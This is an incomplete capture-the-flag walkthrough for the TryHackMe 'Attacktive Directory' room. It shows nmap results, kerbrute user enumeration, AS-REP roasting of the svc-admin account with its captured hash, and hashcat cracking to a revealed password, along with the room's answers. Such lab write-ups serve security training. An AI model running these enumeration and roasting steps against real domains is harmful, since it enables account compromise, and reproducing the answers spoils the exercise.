# Attacktive Directory

- [Tools](#tools)
- [Deploy The Machine](#deploy-the-machine)
- [Setup](#setup)
- [Welcome to Attacktive Directory](#welcome-to-attacktive-directory)
- [Enumerating Users via Kerberos](#enumerating-users-via-kerberos)
- [Abusing Kerberos](#abusing-kerberos)
- [Back to the Basics](#back-to-the-basics)
- [Elevating Privileges within the Domain](#elevating-privileges-within-the-domain)
- [Flag Submission Panel](#flag-submission-panel)

Room Link: https://tryhackme.com/r/room/attacktivedirectory

## Tools
1. NMap
2. [kerbrute](https://github.com/ropnop/kerbrute/releases)
3. Impacket
4. 

## Deploy The Machine
1. Goto Access and get ovpn file to connect https://tryhackme.com/access Or, Start attackbox for testing.
2. `Start Machine` and get Target IP from "Target Machine Information".
3. Now, Click on all four Completes.

## Setup
1. Follow Instructions in this section, to `Install Impacket, Bloodhound and Neo4j`.
2. After installing click on `Complete`.

## Welcome to Attacktive Directory
1. Running nmap scan shows some open ports, command used `nmap -sV -sC 10.10.94.138`.
   ```bash
   nmap -sV -sC 10.10.94.138
   Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-24 12:12 IST
   Nmap scan report for 10.10.94.138
   Host is up (0.17s latency).
   Not shown: 987 closed tcp ports (reset)
   PORT     STATE SERVICE       VERSION
   53/tcp   open  domain        Simple DNS Plus
   80/tcp   open  http          Microsoft IIS httpd 10.0
   | http-methods: 
   |_  Potentially risky methods: TRACE
   |_http-server-header: Microsoft-IIS/10.0
   |_http-title: IIS Windows Server
   88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-24 06:49:23Z)
   135/tcp  open  msrpc         Microsoft Windows RPC
   139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
   389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
   445/tcp  open  microsoft-ds?
   464/tcp  open  kpasswd5?
   593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
   636/tcp  open  tcpwrapped
   3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
   3269/tcp open  tcpwrapped
   3389/tcp open  ms-wbt-server Microsoft Terminal Services
   |_ssl-date: 2024-08-24T06:49:42+00:00; 0s from scanner time.
   | rdp-ntlm-info: 
   |   Target_Name: THM-AD
   |   NetBIOS_Domain_Name: THM-AD
   |   NetBIOS_Computer_Name: ATTACKTIVEDIREC
   |   DNS_Domain_Name: spookysec.local
   |   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
   |   Product_Version: 10.0.17763
   |_  System_Time: 2024-08-24T06:49:33+00:00
   | ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
   | Not valid before: 2024-08-23T06:06:09
   |_Not valid after:  2025-02-22T06:06:09
   Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
   
   Host script results:
   | smb2-security-mode: 
   |   3:1:1: 
   |_    Message signing enabled and required
   | smb2-time: 
   |   date: 2024-08-24T06:49:37
   |_  start_date: N/A
   
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 449.40 seconds
   ```
2. Question `What tool will allow us to enumerate port 139/445?` Answer `enum4linux`. `enum4linux` can be used to enumerate `139`/`445` ports.
3. Question `What is the NetBIOS-Domain Name of the machine?` Answer `THM-AD`
4. Question `What invalid TLD do people commonly use for their Active Directory Domain?` Answer `.local`

## Enumerating Users via Kerberos
1. Now, we will bruteforce Kerberos with [kerbrute](https://github.com/ropnop/kerbrute/releases) using given `userlist.txt` and `passwordlist.txt`. So, at first we need to download those wordlists and install `kerbrute`.
2. Assign `spookysec.local` to machine ip is in `host` file. We can simply edit `/etc/hosts` file in Linux to assign domain to the ip.
3. We can use this command `kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt` to enumerate users. We got some valid usernames after scanning.
   ```bash
   james@spookysec.local
   svc-admin@spookysec.local
   robin@spookysec.local
   darkstar@spookysec.local
   administrator@spookysec.local
   backup@spookysec.local
   paradox@spookysec.local
   ```
4. Question `What command within Kerbrute will allow us to enumerate valid usernames?` Answer `userenum`.
5. Question `What notable account is discovered? (These should jump out at you)` Answer `svc-admin`. `svc-admin` typically suggests a `service account` (`svc`) with `administrative privileges` (`admin`).
6. Question `What is the other notable account is discovered? (These should jump out at you)` Answer `backup`.

## Abusing Kerberos
1. Read this section, then proceed.
2. We can use `GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass` or `GetNPUsers.py -dc-ip spookysec.local spookysec.local/ -no-pass -usersfile user.txt` after saving all users to `user.txt` to capture `TGT Token` of `svc-admin` using ASREPRoasting method.
   ```bash
   GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
   Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
   
   [*] Getting TGT for svc-admin
   $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:92f01444cd97361751ec4fb5b5ea985a$04b60fa94a84739e7db13609241d16247154e8d1f952c26a0c5063e53d08c9a4365690982460f7872d8ade23113cd4df929c85d5404f4380fdcaa5af2ee22d7988d7ee428e535be1b2dcff88bf574d418ca88c3b435cea77b6ea322b510bcf59ac1fba479d54db52104c3bec497cf1b81ddcd384bbb5d115ba2c380f0520705c7b63c88f548f17a9c6c8c1b746175b896b29555a45002ad5195a90d42c45193e42915a1107ed46a6b79da94b835f5e7bd8858c0bb7f07fecab80f7097c769da284ea270697500ea73ea223d93684e8d087248610cf7809d076d5e97564e9729ec5aa04656eaec9f3f5a92ecfaa8524346e93
   ```
3. Question `We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?` Answer `svc-admin`
4. Question `Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)` Answer `Kerberos 5 AS-REP etype 23`. Source: https://hashcat.net/wiki/doku.php?id=example_hashes
5. Question `What mode is the hash?` Answer `18200` Source: https://hashcat.net/wiki/doku.php?id=example_hashes
6. We can save the `TGT hash` inside a file named `hash.txt` with given passwordlist and crack it with `hashcat -m 18200 hash.txt --wordlist passwordlist.txt`.
7. Question `Now crack the hash with the modified password list provided, what is the user accounts password?` Answer `management2005`
   
## Back to the Basics

## Elevating Privileges within the Domain

## Flag Submission Panel

Author: Zishan Ahamed Thandar
